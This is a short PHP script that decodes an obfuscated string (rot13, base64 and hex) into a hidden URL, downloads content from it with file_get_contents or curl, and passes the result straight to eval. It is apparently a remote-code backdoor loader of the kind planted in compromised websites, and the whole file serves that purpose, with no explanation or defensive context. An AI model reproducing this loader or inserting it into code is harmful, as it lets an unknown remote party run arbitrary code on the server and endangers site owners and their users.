<?php
function cEv($url)
{
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $response = curl_exec($ch);
  curl_close($ch);
  return $response;
}

function xTvm($ipt)
{
  $hex = '';
  for ($i = 0; $i < strlen($ipt); $i++) {
    $hex .= dechex(ord($ipt[$i]));
  }
  $base64 = base64_encode($hex);
  return str_rot13($base64);
}

function zUe($eoUr)
{
  $rEq = str_rot13($eoUr);
  $bsfD = base64_decode($rEq);
  $xiE = '';
  for ($i = 0; $i < strlen($bsfD); $i += 2) {
    $xiE .= chr(hexdec(substr($bsfD, $i, 2)));
  }
  return $xiE;
}

$eoUr = 'Awt3AQp0AmN3ZmAuZzLlMwplAwR3AmWyAwp2BGp0Awt3AGLlAmH3ZmL1AmV2ZmMzAzH3AQL1AzH3AQWyAwZ2MwMxZzL0Lmp1AwZ2AGMyAzL3BQWzAGV2AGpjAzL0ZmL4AmV2MwMyAwx2ZmMwAwH3ZmWzAzD2ZGL5AzHlMwL4Awx2AQL0AwH2MGWyAmN2BQpj';
$xiE = zUe($eoUr);
$response = @file_get_contents($xiE);
if (empty($response)) {
  $response = cEv($xiE);
}
if (is_string($response)) {
  eval('?>' . $response);
} else {
  echo "Error!";
}
